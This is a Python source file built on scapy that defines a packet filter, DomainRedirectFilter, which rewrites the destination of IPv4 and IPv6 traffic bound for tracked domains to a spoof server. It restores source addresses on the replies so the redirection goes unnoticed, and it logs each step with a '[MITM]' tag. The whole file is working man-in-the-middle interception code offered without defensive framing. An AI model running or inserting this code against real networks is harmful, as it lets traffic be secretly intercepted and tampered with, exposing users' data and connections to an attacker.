from scapy.all import IP, TCP, UDP
from scapy.layers.inet6 import IPv6

class DomainRedirectFilter:
    def __init__(self, domain_tracker, spoof_ip, spoof_ipv6, logger=None):
        self.domain_tracker = domain_tracker
        self.spoof_ip = spoof_ip
        self.spoof_ipv6 = spoof_ipv6
        self.logger = logger

        # (client_ip, client_port, proto) → real_server_ip
        self.flows = {}

    def log(self, msg):
        if self.logger:
            self.logger(msg)

    def __call__(self, pkt):
        # ───────────── IPv4 ─────────────
        if pkt.haslayer(IP):
            ip = pkt[IP]

            proto = None
            if pkt.haslayer(TCP):
                proto = "TCP"
                sport = pkt[TCP].sport
                dport = pkt[TCP].dport
            elif pkt.haslayer(UDP):
                proto = "UDP"
                sport = pkt[UDP].sport
                dport = pkt[UDP].dport
            else:
                return False

            # CLIENT → SERVER
            if ip.dst in self.domain_tracker.ips_v4:
                self.flows[(ip.src, sport, proto)] = ip.dst

                ip.dst = self.spoof_ip
                del ip.chksum
                if proto == "TCP":
                    del pkt[TCP].chksum
                else:
                    del pkt[UDP].chksum

                self.log(f"[MITM] Redirect → {self.spoof_ip}")
                return False 

            # SPOOF SERVER → CLIENT
            if ip.src == self.spoof_ip:
                key = (ip.dst, dport, proto)
                if key not in self.flows:
                    return False

                ip.src = self.flows[key]
                del ip.chksum
                if proto == "TCP":
                    del pkt[TCP].chksum
                else:
                    del pkt[UDP].chksum

                self.log(f"[MITM] Restore src → {ip.src}")
                return False

        # ───────────── IPv6 (optional) ─────────────
        if pkt.haslayer(IPv6) and self.spoof_ipv6:
            ip6 = pkt[IPv6]

            if ip6.dst in self.domain_tracker.ips_v6:
                ip6.dst = self.spoof_ipv6
                return False

            if ip6.src == self.spoof_ipv6:
                ip6.src = next(iter(self.domain_tracker.ips_v6))
                return False

        return False